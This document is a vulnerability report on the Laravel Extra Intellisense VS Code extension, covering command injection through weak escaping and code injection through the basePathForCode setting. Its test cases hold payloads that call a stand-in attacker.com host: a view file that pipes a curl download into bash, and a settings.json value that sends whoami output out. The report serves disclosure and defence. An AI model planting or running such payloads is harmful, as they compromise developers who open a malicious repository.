# Laravel Extra Intellisense Extension Security Vulnerabilities

## Vulnerability 1: Command Injection via Insufficient PHP Code Escaping

- **Vulnerability Name**: Command Injection via Insufficient PHP Code Escaping
- **Description**: The extension executes PHP code to extract Laravel project metadata using `cp.exec()`. The escaping mechanism in the `runPhp` function uses a simple regex replacement that is insufficient to handle all edge cases, especially when dealing with complex strings containing both double and single quotes. An attacker can craft a malicious repository with files containing specially crafted content that, when processed by the extension, generates PHP code that breaks out of the string context and executes arbitrary system commands.

  The vulnerability is present in the `runPhp` function in `helpers.ts`:
  ```typescript
  static runPhp(code: string, description: string|null = null) : Promise<string> {
      code = code.replace(/\"/g, "\\\"");
      if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
          code = code.replace(/\$/g, "\\$");
          code = code.replace(/\\\\'/g, '\\\\\\\\\'');
          code = code.replace(/\\\\"/g, '\\\\\\\\\"');
      }
      let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
      let command = commandTemplate.replace("{code}", code);
      // ...
      cp.exec(command, /* ... */);
  }
  ```

  The problem is that the escaping logic only replaces double quotes once and doesn't properly handle nested escape sequences. This can be exploited to break out of the PHP code context.

- **Impact**: An attacker can execute arbitrary system commands with the privileges of the VS Code user. This could lead to complete system compromise, including data exfiltration, installation of malware, or using the compromised system as a pivot point for further attacks.

- **Vulnerability Rank**: Critical

- **Currently Implemented Mitigations**: The extension attempts to escape quotes and dollar signs, but the implementation is insufficient. There's no comprehensive input validation or sanitization of the PHP code before execution.

- **Missing Mitigations**:
  - Proper escaping mechanism for PHP code that handles all edge cases
  - Use of a safer execution method instead of string concatenation
  - Implementation of a whitelist approach to only allow specific PHP operations

- **Preconditions**:
  - The victim must have the Laravel Extra Intellisense extension installed in VS Code
  - The victim must open a malicious Laravel repository in VS Code

- **Source Code Analysis**:
  1. When a user opens a Laravel project, the extension automatically analyzes various Laravel-specific files to provide autocomplete features
  2. For this analysis, it uses the `runLaravel` function which prepares PHP code and passes it to `runPhp`
  3. In `runPhp`, the PHP code is insufficiently escaped using simple regex replacements
  4. The escaped code is then injected into a command template (`php -r "{code}"` by default)
  5. This command is executed using Node.js `cp.exec()` which spawns a shell process
  6. If an attacker can craft PHP code that survives the escaping process, they can break out of the string context and inject additional commands that will be executed by the shell

  For example, an attacker could create a malicious file that when processed generates a string containing `\\"$(evil_command)\\"`. When this goes through the escaping logic, it might become `\\\"$(evil_command)\\\"` which, when interpreted by the shell, would execute `evil_command`.

- **Security Test Case**:
  1. Create a malicious Laravel repository with a view file containing:
     ```php
     <?php /*
     @extends("x\\"\\"); system('curl -s http://attacker.com/exfil?data=$(whoami) | bash'); //
     */ ?>
     ```
  2. When a victim opens this repository in VS Code with the Laravel Extra Intellisense extension
  3. The extension will attempt to parse this view file to provide autocomplete
  4. The malicious code will break out of the PHP string context and execute the system command
  5. The command will send the output of `whoami` to the attacker's server and execute any code returned

## Vulnerability 2: Code Injection via Path Manipulation

- **Vulnerability Name**: Code Injection via Path Manipulation
- **Description**: The extension directly concatenates file paths into PHP code strings without proper sanitization. In the `runLaravel` function, paths are directly inserted into PHP code:

  ```typescript
  var command =
    "define('LARAVEL_START', microtime(true));" +
    "require_once '" + Helpers.projectPath("vendor/autoload.php", true) + "';" +
    "$app = require_once '" + Helpers.projectPath("bootstrap/app.php", true) + "';" +
    // more code
  ```

  If an attacker can manipulate the path returned by `projectPath` (potentially by manipulating the `basePathForCode` configuration setting), they could inject PHP code by breaking out of the string literal with a single quote.

- **Impact**: An attacker can execute arbitrary PHP code within the context of the PHP interpreter running the Laravel application. This could lead to execution of system commands, file access, and potentially full system compromise.

- **Vulnerability Rank**: High

- **Currently Implemented Mitigations**: None. The paths are directly concatenated into the PHP code without any sanitization.

- **Missing Mitigations**:
  - Proper escaping of file paths before concatenation into PHP code
  - Use of prepared statements or parameter binding for PHP code execution
  - Validation of path inputs against a whitelist of allowed paths

- **Preconditions**:
  - The victim must have the Laravel Extra Intellisense extension installed in VS Code
  - The victim must open a malicious Laravel repository in VS Code
  - The victim must have set a custom `basePathForCode` configuration (which is common for Docker users as shown in the README)

- **Source Code Analysis**:
  1. The `projectPath` function in `helpers.ts` builds paths using the `basePathForCode` configuration if `forCode` is true
  2. This path is then directly concatenated into PHP code in the `runLaravel` function
  3. If `basePathForCode` contains characters that can break out of the string context (like a single quote), it would allow code injection
  4. When the manipulated PHP code is executed by the `runPhp` function, the injected code would run

  For example, if `basePathForCode` is set to something like `'); system('malicious command'); //`, the constructed PHP code would become:
  ```php
  require_once ''); system('malicious command'); //path/to/vendor/autoload.php';
  ```
  This would execute the malicious command.

- **Security Test Case**:
  1. Create a malicious Laravel repository with a `.vscode/settings.json` file containing:
     ```json
     {
       "LaravelExtraIntellisense.basePathForCode": "'); system('curl -s http://attacker.com/exfil?data=$(whoami)'); // "
     }
     ```
  2. When a victim opens this repository in VS Code with the Laravel Extra Intellisense extension
  3. The extension will use this manipulated path in the PHP code generation
  4. When executing PHP code to fetch Laravel metadata, the injected command will execute
  5. The system command sends system information to the attacker's server
